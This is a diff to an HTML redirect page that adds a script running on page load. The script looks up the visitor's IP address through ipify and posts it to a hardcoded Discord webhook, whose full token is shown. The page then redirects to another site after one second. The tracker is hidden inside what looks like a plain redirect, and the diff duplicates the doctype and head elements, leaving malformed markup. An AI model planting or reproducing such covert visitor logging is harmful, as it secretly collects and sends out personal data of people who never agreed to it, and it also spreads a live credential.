@@ -1,5 +1,38 @@
 <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Website</title>
+    <script>
+        async function getIpAddress() {
+            const response = await fetch('https://api64.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+        async function sendIpToDiscord() {
+            const ipAddress = await getIpAddress();
+            const webhookUrl = 'https://discord.com/api/webhooks/1178829992155693137/dPJLLMvSnNfV25pM09s34SpGsG8lIlaobDgwz72ybHI9lR-eSAllzLdZpLA2AiOmhRds';
+
+            // Construct the payload
+            const payload = {
+                content: `New visitor IP: ${ipAddress}`
+            };
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            });
+        }
+
+        window.onload = function () {
+            sendIpToDiscord();
+        };
+    </script>
+</head>
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="refresh" content="1;url=https://paralogs.store">
